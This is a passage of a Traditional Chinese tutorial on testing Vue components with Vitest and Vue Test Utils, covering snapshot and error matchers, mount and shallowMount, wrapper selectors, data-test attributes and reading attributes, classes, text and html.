toHaveReturnedTimes：斷言函式經過操作後應該要返回值幾次 1 2 3 4 5 6 7 const sayHi = (something) =\u0026gt; something const spyOnSayHi = vi.fn((val) =\u0026gt; sayHi(val)) spyOnSayHi(\u0026#39;Nice to meet you!\u0026#39;) spyOnSayHi(\u0026#39;See you again!\u0026#39;) expect(spyOnSayHi).toHaveReturnedTimes(2) toHaveLastReturnedWith：斷言函式經過操作後最後應該要返回的值 1 2 3 4 5 6 7 const sayHi = (something) =\u0026gt; something const spyOnSayHi = vi.fn((val) =\u0026gt; sayHi(val)) spyOnSayHi(\u0026#39;Nice to meet you!\u0026#39;) spyOnSayHi(\u0026#39;See you again!\u0026#39;) expect(spyOnSayHi).toHaveLastReturnedWith(\u0026#39;See you again!\u0026#39;) toHaveNthReturnedWith：斷言函式經過操作後第 N 次應該要返回的值 1 2 3 4 5 6 7 const sayHi = (something) =\u0026gt; something const spyOnSayHi = vi.fn((val) =\u0026gt; sayHi(val)) spyOnSayHi(\u0026#39;Nice to meet you!\u0026#39;) spyOnSayHi(\u0026#39;See you again!\u0026#39;) expect(spyOnSayHi).toHaveNthReturnedWith(1, \u0026#39;Nice to meet you!\u0026#39;) toHaveReturnedWith：斷言函式呼叫後返回的值 1 2 3 4 5 6 const sayHi = (something) =\u0026gt; something + \u0026#39; Hello, Spy!\u0026#39; const spyOnSayHi = vi.fn((val) =\u0026gt; sayHi(val)) spyOnSayHi(\u0026#39;Hello, Unit-Test!\u0026#39;) expect(spyOnSayHi).toHaveReturnedWith(\u0026#39;Hello, Unit-Test! Hello, Spy!\u0026#39;) 而測試替身(test double)除了像是 vi.fn() 這類間諜類型(Spy)之外，還有許多不同的測試替身，它們在測試中都有各自的用途來協助我們更好的測試。\n快照測試(Snapshot Testing)與快照 matchers Jest Snapshot 在 Jest 的 Snapshot Testing 說明文件的定義中主要指的是用來防止 UI 出現尚未預期的變化：\n1 2 3 \u0026lt;template\u0026gt; \u0026lt;a data-test=\u0026#34;link\u0026#34; href=\u0026#34;http://ithelp.ithome.com.tw\u0026#34;\u0026gt; Ithelp \u0026lt;/a\u0026gt; \u0026lt;/template\u0026gt; 1 2 3 4 5 import { mount } from \u0026#39;@vue/test-utils\u0026#39; it(\u0026#39;渲染連結\u0026#39;, () =\u0026gt; { const wrapper = mount(component) expect(wrapper.find([data-test=\u0026#34;link\u0026#34;])).toMatchSnapshot(); }); 然而這邊的變化，並非你所想像的把視覺畫面給照相下來比對像素或比例的那種視覺回歸測試(Visual Regression Testing)，而是藉由將目標元件透過渲染(Render)元件產生了一個 DOM 結構的文字，並在測試程式檔路徑底下的 __snapshots__ 資料夾生成一個 .snap 檔案來做紀錄：\n1 2 3 4 5 6 7 8 exports[`渲染連結`] = ` \u0026lt;a data-test=\u0026#34;link\u0026#34; href=\u0026#34;http://ithelp.ithome.com.tw\u0026#34; \u0026gt; Ithelp \u0026lt;/a\u0026gt; `; 截至 Jest Snapshot 頁面中的程式碼\n在第二次執行測試的時候，就會再次做一次同樣的流程，而這次所產生的結果會與先前的 .snap 紀錄做比對。\n假設比對上有落差就會拋出錯誤：\n1 2 3 4 5 6 7 8 - Snapshot - 1 + Received + 1 \u0026lt;a - href=\u0026#34;http://ithelp.ithome.com.tw\u0026#34; + href=\u0026#34;https://ithelp.ithome.com.tw\u0026#34; \u0026gt; Ithelp \u0026lt;/a\u0026gt; 藉由這個比對機制從而實現「防止 UI 出現尚未預期的變化」的功能。\nVitest Snapshot 而前面有提到 Vitest 本身兼容了 Jest 的斷言(assertion)語法，所以快照(Snapshot)的 matcher 自然也是不能放過。\n在 Vitest 中主要兼容的 matcher 部分有：\ntoMatchSnapshot toMatchInlineSnapshot 基本上概念與 Jest Snapshot 相似，都是在做結構快照這件事情，然而 Vitest 文件部分則是沒有特地強調 UI 的部分，而是關注在值(value)的比對。\n因此我們單純放入一個陣列物件\n1 2 3 4 5 6 7 8 9 10 11 12 13 it(\u0026#39;cat snapshot\u0026#39;, () =\u0026gt; { const target = [ { name: \u0026#39;Orange\u0026#39;, age: 4, }, { name: \u0026#39;Blank\u0026#39;, age: 6, }, ] expect(target).toMatchSnapshot() }) .snap 的結果：\n1 2 3 4 5 6 7 8 9 10 11 12 exports[`component \u0026gt; cat snapshot 1`] = ` [ { \u0026#34;age\u0026#34;: 4, \u0026#34;name\u0026#34;: \u0026#34;Orange\u0026#34;, }, { \u0026#34;age\u0026#34;: 6, \u0026#34;name\u0026#34;: \u0026#34;Blank\u0026#34;, }, ] `; 甚至也可以引入 JSON 檔案來做快照：\n1 2 3 4 5 import Area from \u0026#39;./area.json\u0026#39; it(\u0026#39;static json snapshot\u0026#39;, () =\u0026gt; { expect(Area).toMatchSnapshot() }) 當然元件快照也是能做的：\n1 2 3 4 5 6 7 import { mount } from \u0026#39;@vue/test-utils\u0026#39; it(\u0026#39;snapshot\u0026#39;, () =\u0026gt; { const wrapper = mount(component) const target = wrapper.find(\u0026#39;[data-test=\u0026#34;content\u0026#34;]\u0026#39;) expect(target).toMatchSnapshot() }) 而以上快照部分如果你覺得要生成一個檔案來管理有點囉唆，那麼你可以透過 toMatchInlineSnapshot 來處理這類的需求，其差別在於生成的位置會是在 toMatchInlineSnapshot() 函式本身裡面：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 it(\u0026#39;cat snapshot\u0026#39;, () =\u0026gt; { const target = [ { name: \u0026#39;Orange\u0026#39;, age: 4, }, { name: \u0026#39;Blank\u0026#39;, age: 6, }, ] // 原先 toMatchInlineSnapshot 內沒有任何東西 // 在執行測試後就會將快照內容自動生成在 toMatchInlineSnapshot 裡 expect(target).toMatchInlineSnapshot(` [ { \u0026#34;age\u0026#34;: 4, \u0026#34;name\u0026#34;: \u0026#34;Orange\u0026#34;, }, { \u0026#34;age\u0026#34;: 6, \u0026#34;name\u0026#34;: \u0026#34;Blank\u0026#34;, }, ] `) }) 最後，如果遇到變更的部分是我們所預期的時候，此時就需要更新快照的部分，可以在執行測試的 watch 模式時按下 u 鍵，就將新的快照保存起來，或是透過新增 npm scripts 指令來執行命令：\n1 2 3 4 5 { \u0026#34;scripts\u0026#34;: { \u0026#34;test:update\u0026#34;: \u0026#34;vitest -u\u0026#34;, }, } Error 最後介紹到的則是錯誤類型的 Matcher：\ntoThrowError toThrowErrorMatchingSnapshot toThrowErrorMatchingInlineSnapshot 先前我們有提到測試案例預想的三個路徑(Happy path、sad Path、Bad Path)，Bad Path 從產品角度上來說 End-User 使用上的錯誤，應該考慮從產品使用角度上去思考要怎麼協助他們去使用，所以不應該為了拋出錯誤而拋出。\n但假設今天拋出錯誤的情境是較為合理的部分，比方是針對開發人員在開發時期誤用導致的錯誤⋯⋯等等情況，這時我們就可以透過這一類 Matcher 來處理。\n而使用上要比較小心的是，受測目標若會拋出錯誤則要透過 wrap function 的形式來處理，否則拋出的錯誤會造成測試案例的斷言錯誤：\n1 2 3 4 5 6 7 8 9 10 it(\u0026#39;\u0026#39;, ()=\u0026gt;{ const food = (name) =\u0026gt; { // ... if(name === \u0026#39;小黃瓜\u0026#39;){ throw new Error(\u0026#39;我不吃小黃瓜\u0026#39;) } } expect(food(\u0026#39;小黃瓜\u0026#39;)).toThrowError(\u0026#39;我不吃小黃瓜\u0026#39;) // 若這樣寫的話裡頭的 Error 會導致測試案例失敗 expect(() =\u0026gt; food(\u0026#39;小黃瓜\u0026#39;)).toThrowError(\u0026#39;我不吃小黃瓜\u0026#39;) // 需要透過這種方式才能正確斷言 }) 元件測試 Vue Test Utils 與元件測試 接著，若我們想進一步在專案中測試 Vue 元件的話，我們除了基於前面的概念與語法之外，還得依靠能夠幫助能夠解析 Vue 元件並與其模擬互動的工具：\nVue Test Utils Cypress Vue Testing Library 而本篇將著重在介紹要怎麼透過 Vue Test Utils 來進行與 Vue 元件有關的「元件測試」，因此本文要來介紹一下 Vue Test Utils 與元件測試是在做什麼，又這又跟單元測試有什麼關係呢。\nVue-Test-Utils 首先區辨一下他與我們目前用到的測試工具的各自用處，才能更瞭解接下學的內容是由哪個工具負責的，將來有必要查閱資料時就能更清楚的區別他們。\nVue Test Utils 主要是作為提供測試 Vue 元件的相關工具集，讓我們能更輕易的模擬操作元件來進行測試，但本身並沒有運行測試環境(test runner)的功能，因此我們會需要藉由 Vitest 來作為測試環境以及相關的測試情境案例與斷言 Matcher；除此之外我們還需要用來在 Node 環境中模擬瀏覽器環境的 jsdom 來協助處理有關 DOM 上的操作，如此一來才能順利地使用 Vue Test Utils。\n而版本的部分要特別注意到，由於 Vue Test Utils 為了相容 Vue 不同版本之間的 API 因此我們要安裝對應的版本未來才不會出錯：\nVue 2：安裝 Vue Test Utils 1 Vue 3：安裝 Vue Test Utils 2 確認版本沒問題後，模擬元件的部分交給 Vue Test Utils 基本上就沒問題了，但關於「元件測試」目標主要是要測試什麼東西呢？\n元件測試的目標 測試本質主要是在預期結果與實際是否相等，而在元件測試中作為受測物的元件，其本身主要是負責 UI 上的一切內容，因此我們測試目標在著重於它的「畫面」與「行為」上是否如我們所預期。\n因此，在測試案例的操作過程中(也就是 3A 中的 Action 階段)，我們主要是藉由操作對元件介面中的：\ndata props slot provide directive Event(瀏覽器中的互動行為) API response(模擬回應) 來判斷下列是否如我們所預期：\nDOM 渲染結果 emit 行為 好的元件測試 當然，做到上面的事項基本上已經可以算是個元件測試了，若我們想讓元件測試寫得更好，除了先前在單元測試提過的一些概念之外，還有一些值得注意的事項：\n首先，在撰寫元件測試時的角度，我們並沒有要當個全能全知的神，而是作為「使用者的角度」關注元件介面上來預期結果，所以在測試的過程中我們要「避免又寫了一次實作」。\n另外，如果內部邏輯過於複雜時，我們則應該先抽取(extract)其邏輯，透過 composables 的寫法來引入，如此一來我們就能「專注於在元件本身的行為上」，另外也能「針對 composable 的邏輯單獨做測試」。\n最後，若元件中有使用到 API 的部分，同樣的我們應該把它當作成是他提供給元件去使用，而元件主要是「接收回應」後就能自行處理後續的內容了，所以在測試上我們應該專注在 API 提供了什麼給元件，透過模擬資料的部分來達成先前提過的 FIRST 原則中的 Fast，最後斷言元件最終的行為是否如預期即可。\n現在我們知道 Vue Test Utils 在做什麼了，也知道「元件測試」在做什麼了，但這跟單元測試又有什麼關係呢？\n元件測試與單元測試的關係 在官方文件中測試章節有提到，元件測試(component testing)在顆粒度上其實是高於單元測試(unit testing)的，甚至可以被視為是整合測試(integration testing)的一種形式。\n而坊間有不少文章習慣以單元測試來統稱這一類測試，最主要原因是單元測試的定義為「軟體設計」中最小單位的程式或行為，在 Vue 專案中，若以 Vue SFC 類型檔案(.vue)來看其實測試元件也算是最小單位沒錯。\n所以從意義上來劃分單元測試與元件測試，某方面來說很容易出現歧異(甚至單元測試本身就已經有分為獨立型與社交型寫法了)。\n然而為了接下來在本系列文中方便區分指的測試對象是哪部分，我將名稱含義分為：\n元件測試：針對 Vue 元件所進行的測試 單元測試：針對元件引入函式、類別等 utils、helper 與 composable 的測試。 工具本身：Pinia 測試、Vue Router 測試。 元件測試：容器(Wrapper) mount 當我們需要在測試案例中引入元件時，我們可以透過 Vue Test Utils 提供的方法 mount 來包裹 Vue 元件。而 mount 所返回的內容除了 Vue 實體之外，還包含了一些方法（Wrapper methods）可以讓我們操作元件：\n1 2 3 4 5 6 7 8 9 10 11 12 import component from \u0026#39;@/component/BaseButton.vue\u0026#39; it(\u0026#39;should emit clicked event after clicking button\u0026#39;, () =\u0026gt; { // Arrange const wrapper = mount(component) // Act wrapper.trigger(\u0026#39;click\u0026#39;) // Assert export(wrapper.emitted()).toHaveProperty(\u0026#39;clicked\u0026#39;) }) 假若我們希望在渲染元件的時候同時帶著預設參數與狀態時（如 props、slots\u0026hellip;等），就能夠透過 mount 方法的第二個參數傳入設定：\n1 2 3 4 5 6 7 const options = { props: { content: \u0026#39;Hello, Props!\u0026#39; } } const wrapper = mounted(component, options) expect(wrapper.text()).toBe(\u0026#39;Hello, Props!\u0026#39;) 而關於方法（Wrapper methods）與選項（Wrapper options）的部分，會根據元件使用 Options API / Composition API / setup script 語法糖 而有不同的用法與限制，因此使用方法與差異的部分將在後續測試各種元件時陸續會提到。\nshallowMount 在正常的專案開發下，元件時常會嵌入了另一個元件：\nRootComponent.vue 1 \u0026lt;ParentComponent\u0026gt;\u0026lt;/ParentComponent\u0026gt; ParentComponent.vue 1 2 3 \u0026lt;ChildComponent\u0026gt;\u0026lt;/ChildComponent\u0026gt; \u0026lt;ChildComponent\u0026gt;\u0026lt;/ChildComponent\u0026gt; \u0026lt;ChildComponent\u0026gt;\u0026lt;/ChildComponent\u0026gt; ChildComponent.vue 1 \u0026lt;p\u0026gt;baby\u0026lt;/p\u0026gt; RootComponent 的元件測試：\n1 2 3 4 5 6 7 8 9 import component from \u0026#39;./RootComponent.vue\u0026#39; it(\u0026#39;should render corrent content\u0026#39;, async () =\u0026gt; { const wrapper = mount(component) expect(wrapper.html()).toBe(` \u0026lt;p\u0026gt;baby\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;baby\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;baby\u0026lt;/p\u0026gt; `) }) 但如此一來若我們在測試 RootComponent 元件的時候，就有可能因為底下的 ChildComponent 元件更改了內容導致 RootComponent 測試案例也跟著失敗：\n1 \u0026lt;p\u0026gt;baby\u0026lt;/p\u0026gt; 若「有意」想要避免這種情況發生，此時就可以將 mount 替換掉，改使用 shallowMount 來作為容器使用：\n1 2 3 4 5 import component from \u0026#39;./RootComponent.vue\u0026#39; it(\u0026#39;should render corrent content\u0026#39;, async () =\u0026gt; { const wrapper = shallowMount(component) // ... }) shallowMount 與 mount 在使用上幾乎大同小異，而唯一有差別在於他會將原先內部有用到元件的部分以替換為一個模擬元件（stub component），並且命名改以烤肉串命名法（Kebab case）並且在最末端加上 -stub 供辨識：\nRootComponent.vue 1 \u0026lt;ParentComponent\u0026gt;\u0026lt;/ParentComponent\u0026gt; 經 shallowMount 渲染結果變成：\nRootComponent.vue 1 \u0026lt;parent-component-stub\u0026gt;\u0026lt;/parent-component-stub\u0026gt; 如此一來在撰寫測試案例時，就可以關注在當下「父層元件」與「子層元件」的之間的內容，而不管「子層元件」底下所發生的事情：\n1 2 3 4 5 6 import component from \u0026#39;./RootComponent.vue\u0026#39; it(\u0026#39;should render corrent content\u0026#39;, async () =\u0026gt; { const wrapper = shallowMount(component) // ... expect(wrapper.html()).toBe(`\u0026lt;parent-component-stub\u0026gt;\u0026lt;/parent-component-stub\u0026gt;`) }) 容器的方法（Wrapper methods） - 選擇器 在進行測試時，前面章節有提到我們會使用 mount 或 shallowMount 來包裹元件，從而得到一個 VueWrapper，而在這個 VueWrapper 裡頭有許多實用的容器方法（Wrapper methods），雖然官方文件中並沒有特意分類，但大意上可分為幾種方法：\n查詢、選擇指定的元素、元件等選擇器 取得目標屬性或內容（class, attribute） 觸發 DOM 事件（如滑鼠點擊、鍵盤輸入與按鍵⋯⋯等） 取得 emit 事件、設置 data 或 prop、甚至觸發元件 unmmount 等 Vue API 相關的方法 這邊著重在於介紹選擇器的方法使用與測試應用，最後補上相關的討論：\n元素、元件選擇器 判斷目標是否存在：exists 與 isVisible 使用 data-* attribute 選擇器 在進行元件測試（component testing）的過程中，有時我們可能只想關注在某個特定 DOM 或元件的相關資訊時，這時我們就可以透過容器中的選擇器方法來尋找，而選擇器根據選取對象的不同，主要分為：\n元素（element）選擇器 元件（component）選擇器 元素選擇器 元素選擇器語法基本上有兩種寫法，一種是基於元素的 refs，另一種則是 querySelector：\n1 2 3 4 5 6 \u0026lt;template\u0026gt; \u0026lt;p ref=\u0026#34;dogcat\u0026#34;\u0026gt;???\u0026lt;/p\u0026gt; \u0026lt;p id=\u0026#34;dog\u0026#34;\u0026gt;科基\u0026lt;/p\u0026gt; \u0026lt;p class=\u0026#34;cat\u0026#34;\u0026gt;橘貓\u0026lt;/p\u0026gt; \u0026lt;p class=\u0026#34;cat\u0026#34;\u0026gt;黑黑\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; 1 2 3 4 5 6 /* ref */ wrapper.find({ ref: \u0026#39;span\u0026#39; }) /* querySelector */ wrapper.find(\u0026#39;#dog\u0026#39;) wrapper.find(\u0026#39;.cat\u0026#39;) 而容器方法有關選取元素的選擇器一共分為三種：\nfind findAll get 這三種選擇器在選取到目標後主要都是返回 DOMWrapper，此時我們就可以在串連其他容器方法（Wrapper methods）如 classes 或 text 等等來取得屬性或內容資訊，只是返回的結果內容會有些差異。\n比方 find、findAll 的部分主要差別在於 findAll 返回的內容會被放置於陣列當中：\n1 2 3 4 5 \u0026lt;template\u0026gt; \u0026lt;p id=\u0026#34;dog\u0026#34;\u0026gt;科基\u0026lt;/p\u0026gt; \u0026lt;p class=\u0026#34;cat\u0026#34;\u0026gt;橘貓\u0026lt;/p\u0026gt; \u0026lt;p class=\u0026#34;cat\u0026#34;\u0026gt;黑黑\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; 而我們可以透過像這樣的方式取得陣列內的資訊：\n1 2 3 4 5 6 7 8 9 10 11 12 it(\u0026#39;should be display correct content\u0026#39;, () =\u0026gt; { const wrapper = mount(component) const target= wrapper.find(\u0026#39;#dog\u0026#39;) // \u0026lt;DOMWrapper\u0026gt; expect(target.text()).toBe(\u0026#39;科基\u0026#39;) }) it(\u0026#39;should be display correct content\u0026#39;, () =\u0026gt; { const wrapper = mount(component) const target= wrapper.findAll(\u0026#39;.cat\u0026#39;) // \u0026lt;DOMWrapper\u0026gt;[] expect(target[0].text()).toBe(\u0026#39;橘貓\u0026#39;) expect(target[1].text()).toBe(\u0026#39;黑黑\u0026#39;) }) 注意：透過 findAll 斷言時是「有序」的，很容易受到順序改變而導致測試案例失敗，除非撰寫測試案例目標之一就是要確保順序不會調動，否則改用 find 斷言會比較不容易受影響。\n而 find 與 get 的差別在於 find 找不到目標時返回的是 {} 後續若仍繼續操作、斷言時才會由拋出錯誤（由 ErrorWrapper 提供）；然而 get 一開始若找不到目標時就直接拋出錯誤（throw Error）了。\n根據 ErrorWrapper 原始碼，可以看見他主要是針對容器方法中的 exists() 會返回 false。\n因此在針對找不到元素的測試案例合法的寫法可以這麼做：\n1 2 expect(() =\u0026gt; wrapper.get(\u0026#39;.something-that-does-not-exist\u0026#39;)).toThrowError() expect(wrapper.find(\u0026#39;.something-that-does-not-exist\u0026#39;).exists()).toBeFalsy() find 判斷元素陷阱 魔鬼藏在細節裡，或許你可能會想說為什麼不直接用 find 還要再另外透過 exists 判斷呢，讓我們看看一個案例：\n1 \u0026lt;p\u0026gt;無關緊要的東西\u0026lt;/p\u0026gt; 如果這時你這麼寫了：\n1 2 expect(wrapper.find(\u0026#39;.something-that-does-not-exist\u0026#39;)).toBeTruthy() // 通過 ！？ 原因在於 find 在找不到的情況下目標的情況所返回的值會是 ErrorWrapper 物件，所以透過 toBeTruthy 斷言就會通過。\n而為了避免這種情況發生，官方文件其實只有輕描淡述地說道：\nAs a rule of thumb, always use get except when you are asserting something doesn\u0026rsquo;t exist. In that case use find.\n但上方經驗考量在哪，只有在追了他們相關的 issue 才會逐漸明白考量的根據，而關於這部分，甚至開發團隊未來可能也會考慮將 find 方法給拔掉，剩下 exists 本身，但礙於這會是個 breaking change 的做法，所以在 vue-test-utils 跳大版本號之前應該都會暫時維持原樣。\n元件（component）選擇器 findComponent findAllfindComponents (注意有個 s） getComponent 原則上使用方式與元素選擇器差不多，只是選取語法上除了 refs 與 querySelector 語法之外，還多了：\nComponent name： findComponent({name: '元件名稱'}) 將 import SFC 直接放入方法中： findComponent(Component) 但由於使用 querySelector 上也有一些小陷阱，所以個人建議以 SFC 方式引入或是乾脆透過 shallowMount 將子層元件 stub 掉也是一種方式。\n判斷目標存在 經由剛剛陷阱的部分大家應該都很清楚 exists() 的存在了，而判斷選取目標其實他還有個好朋友就是 isVisible()，但他們判斷存在的定義上有一些差別：\nexists()：主要判斷的是該目標存不存在 DOM 上： 1 \u0026lt;p\u0026gt;Hello\u0026lt;/p\u0026gt; 1 2 3 4 5 it(exist, () =\u0026gt; { const wrapper = mount(Component) expect(wrapper.find(\u0026#39;p\u0026#39;).exists()).toBe(true) expect(wrapper.find(\u0026#39;span\u0026#39;).exists()).toBe(false) }) isVisable()：主要判斷的是該目標存在 DOM 上之外，視覺上有無顯示在畫面中： 1 2 3 4 5 \u0026lt;template\u0026gt; \u0026lt;p v-if=\u0026#34;false\u0026#34; class=\u0026#34;dog\u0026#34;\u0026gt;科基\u0026lt;/p\u0026gt; \u0026lt;p v-show=\u0026#34;true\u0026#34; class=\u0026#34;orange-cat\u0026#34;\u0026gt;橘貓\u0026lt;/p\u0026gt; \u0026lt;p v-show=\u0026#34;false\u0026#34; class=\u0026#34;black-cat\u0026#34;\u0026gt;黑黑\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 it(\u0026#39;v-if false\u0026#39;, () =\u0026gt; { const wrapper = mount(component) expect(wrapper.find(\u0026#39;.dog\u0026#39;).isVisible()).toBeFalsy() // Error： 直接噴錯 }) it(\u0026#39;v-show true\u0026#39;, () =\u0026gt; { const wrapper = mount(component) expect(wrapper.find(\u0026#39;.orange-cat\u0026#39;).isVisible()).toBeTruthy() // 測試通過 }) it(\u0026#39;v-show false\u0026#39;, () =\u0026gt; { const wrapper = mount(component) expect(wrapper.find(\u0026#39;.black-cat\u0026#39;).isVisible()).toBeFalsy() // 測試通過 }) 關於 isVibile 更為詳細的判斷如下：\nCSS style 中 含有 display: none =\u0026gt; false CSS style 中 含有 visibility: hidden =\u0026gt; false CSS style 中 含有 opacity :0 =\u0026gt; false 元素中 hidden 屬性為 true =\u0026gt; false 綜合結論上方陷阱與判斷方法：\n若要判斷元素是否存在 或 v-if：使用 get 方法是最保險的，真的要用 find 則一定要搭配 exists 若要判斷 v-show：使用 find().isVisible() 使用 data-* attribute 在撰寫測試情境時，若依照上面的 querySelector 選了元素、id 或 class 時，初期一定會很開心，因為不會遇到太多困難，但往後在開發的過程執行測試時就很容易有機會遇到各種問題。\n原先：\n1 2 3 \u0026lt;template\u0026gt; \u0026lt;p class=\u0026#34;content\u0026#34;\u0026gt;content\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; 改成：\n1 2 3 \u0026lt;template\u0026gt; \u0026lt;p class=\u0026#34;content\u0026#34; data-test=\u0026#34;content\u0026#34;\u0026gt;content\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; 使用 data-* 作為選擇目標好處最主要在於顯著標記測試內容，而這影響到的範圍有：\n開發期，過程不用擔心會影響到測試，如上方所見，我只要變更 data-test 以外的內容，預期應該不會影響到測試選擇的目標，使測試案例錯誤能更專注在斷言的目標上，而非選擇目標被替換導致的錯誤。 重構（refactor）過程，能清楚比較範圍，若將來調整結構，只要將屬性轉移到對應的位置即可。 生產期，能夠針對特定的屬性移除，避免留下各種測試痕跡，對於像是輔助閱讀裝置等技術來說就不會被影響到。 在生產環境刪除 data-* attribute 若想在 vitest 中移除 data-* 也非常的簡單，我們只需要在 vite.config.js 設定中，針對 Vue 底下的編譯選項做一些調整即可（底下示範的版本為移除 data-test，若使用其他命名請自行調整囉）：\nvite.config.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 const isProd = process.env.NODE_ENV === \u0026#39;production\u0026#39; const removeDataTestAttrs = (node) =\u0026gt; { const NodeTypes = Object.freeze({ ELEMENT: 1, ATTRIBUTE: 6, }) if (node.type === NodeTypes[\u0026#39;ELEMENT\u0026#39;]) { node.props = node.props.filter((prop) =\u0026gt; (prop.type === NodeTypes[\u0026#39;ATTRIBUTE\u0026#39;] ? prop.name !== \u0026#39;data-test\u0026#39; : true)) // 請自行替換命名 data-test } } export default defineConfig(() =\u0026gt; { return { plugins: [ vue({ template: { compilerOptions: { nodeTransforms: isProd ? [removeDataTestAttrs] : [], }, }, }), ] } }) 容器的方法(Wrapper methods) - 取得目標資訊 判斷屬性 attributes 當你想要確認 \u0026lt;a\u0026gt; 中的 href 是否帶有指定的連結或是檢查 \u0026lt;img\u0026gt; 上的屬性時，這時就可以透過 attributes 取得屬性。\n而 attributes 用法主要有兩種，直接使用時會獲取目標：\n1 \u0026lt;a data-test=\u0026#34;link\u0026#34; href=\u0026#34;https://ithelp.ithome.com.tw/\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt;ithelp\u0026lt;/a\u0026gt; 1 wrapper.find(\u0026#39;[data-test=\u0026#34;link\u0026#34;]\u0026#39;).attributes() // { href: \u0026#39;https://ithelp.ithome.com.tw/\u0026#39;, \u0026#39;target\u0026#39;: \u0026#39;_blank\u0026#39; } 當想要直接取得特定屬性值時也可以直接將屬性名稱帶入參數中：\n1 wrapper.find(\u0026#39;a\u0026#39;).attributes(\u0026#39;target\u0026#39;) // \u0026#39;_blank\u0026#39; classes 同樣的，若想要尋找 class 屬性的話可以透過 classes 語法取得資訊。你可能會直覺地想到 class 也是屬性的一種那應該用 attributes('class') 查詢，然而這兩者的差別最主要在於產出的結果會有所不同。\n1 2 3 \u0026lt;section data-test=\u0026#34;wrap\u0026#34; class=\u0026#34;container w-full h-full\u0026#34;\u0026gt; \u0026lt;p\u0026gt;Title\u0026lt;/p\u0026gt; \u0026lt;/section\u0026gt; 若使用 attributes('class') 查詢結果將會是字串形式的資料，後續要處理比對上的問題會稍微麻煩一點：\n1 wrapper.find(\u0026#39;[data-test=\u0026#34;wrap\u0026#34;]\u0026#39;).attributes(\u0026#39;class\u0026#39;) // \u0026#34;container w-full h-full\u0026#34; 若是使用 classes 語法查詢的話將得到一個陣列的結果：\n1 wrapper.find(\u0026#39;[data-test=\u0026#34;wrap\u0026#34;]\u0026#39;).classes() // [\u0026#34;container\u0026#34;, \u0026#34;w-full\u0026#34;, \u0026#34;h-full\u0026#34;] 此時就可以配合 toContain 等陣列的斷言 Matcher 快速處理測試案例：\n1 expect(wrapper.find(\u0026#39;[data-test=\u0026#34;wrap\u0026#34;]\u0026#39;).classes()).toContain(\u0026#39;container\u0026#39;) 這對於測試樣式採用原子化設計的工具（Tailwind CSS、Windi CSS 等）有奇效，我們可以將視覺層的邏輯透過 classes 的結果斷言。\n因為這類原子化設計工具往往依賴 class 屬性來做樣式上的調整與擴充，通常為了美觀與管理方便會順便在使用這類工具時加裝自動排序（sorting） class 屬性等擴充工具，因此 class 的順序將變成不穩定的狀態。\n因此元素若從：\n1 \u0026lt;p data-test=\u0026#34;content\u0026#34; class=\u0026#34;A B C\u0026#34;\u0026gt;content\u0026lt;/p\u0026gt; 變成：\n1 \u0026lt;p data-test=\u0026#34;content\u0026#34; class=\u0026#34;A C B\u0026#34;\u0026gt;content\u0026lt;/p\u0026gt; 對於快照測試等 Matcher (toMatchSnapshot、toMatchInlineSnapshot)來說將會顯示測試失敗：\n1 expect(wrapper.find(\u0026#39;.content\u0026#39;)).toMatchSnapshot() 快照比對結果：\n1 2 - class=\u0026#34;A B C\u0026#34; + class=\u0026#34;A C B\u0026#34; 而以陣列比對是否「包含」的方式，將不受影響：\n1 2 3 expect(wrapper.find(\u0026#39;.content\u0026#39;).classes()).toContain(\u0026#39;A\u0026#39;) expect(wrapper.find(\u0026#39;.content\u0026#39;).classes()).toContain(\u0026#39;B\u0026#39;) expect(wrapper.find(\u0026#39;.content\u0026#39;).classes()).toContain(\u0026#39;C\u0026#39;) 判斷內容物 text text 主要是取得目標元素節點後代的所有文字：\nRootComponent.vue 1 2 3 4 5 6 \u0026lt;div data-test=\u0026#34;target\u0026#34;\u0026gt; Root \u0026lt;child-component /\u0026gt; \u0026lt;child-component /\u0026gt; \u0026lt;child-component /\u0026gt; \u0026lt;/div\u0026gt; ChildComponent.vue 1 \u0026lt;p\u0026gt;child\u0026lt;/p\u0026gt; 使用 mount 包裝元件時 wrapper.find('[data-test=\u0026quot;target\u0026quot;]').text() 的結果將會是：\n1 Rootchildchildchild 使用 shallowMount 包裝元件時 wrapper.find('[data-test=\u0026quot;target\u0026quot;]').text() 的結果將會是：\n1 Root html 與 text 類似，但 html 會將目標元素後代所有元素都記錄下來：\nRootComponent.vue 1 2 3 4 5 6 \u0026lt;div data-test=\u0026#34;target\u0026#34;\u0026gt; Root \u0026lt;child-component /\u0026gt; \u0026lt;child-component /\u0026gt; \u0026lt;child-component /\u0026gt; \u0026lt;/div\u0026gt; ChildComponent.vue 1 \u0026lt;p\u0026gt;child\u0026lt;/p\u0026gt; 使用 mount 包裝元件時 wrapper.find('[data-test=\u0026quot;target\u0026quot;]').html() 的結果將會是：\n1 2 3 4 Root \u0026lt;p\u0026gt;child\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;child\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;child\u0026lt;/p\u0026gt; 使用 shallowMount 包裝元件時 wrapper.find('[data-test=\u0026quot;target\u0026quot;]').html() 的結果將會是：\n1 2 3 4 Root \u0026lt;child-component-stub\u0026gt;\u0026lt;/child-component-stub\u0026gt; \u0026lt;child-component-stub\u0026gt;\u0026lt;/child-component-stub\u0026gt; \u0026lt;child-component-stub\u0026gt;\u0026lt;/child-component-stub\u0026gt; 因此在使用 text 與 html 來進行斷言時，要注意到「測試所需包含的範圍」以及「元件容器」應採用 mount 還是 shallowMount 等議題，才能讓測試更加強韌且不會讓後續開發無相關的內容時一直被測試攔住。\n容器的方法(Wrapper methods) - 模擬事件 滑鼠事件 常見的 DOM 事件有下列幾種：\n滑鼠事件：點擊（click） 鍵盤事件：按下某鍵（keydown）、鬆開某鍵（keyup） 表單事件：針對 \u0026lt;input\u0026gt; 輸入內容、checkbox 與 radio 勾選或 \u0026lt;select\u0026gt; 中的選擇內容 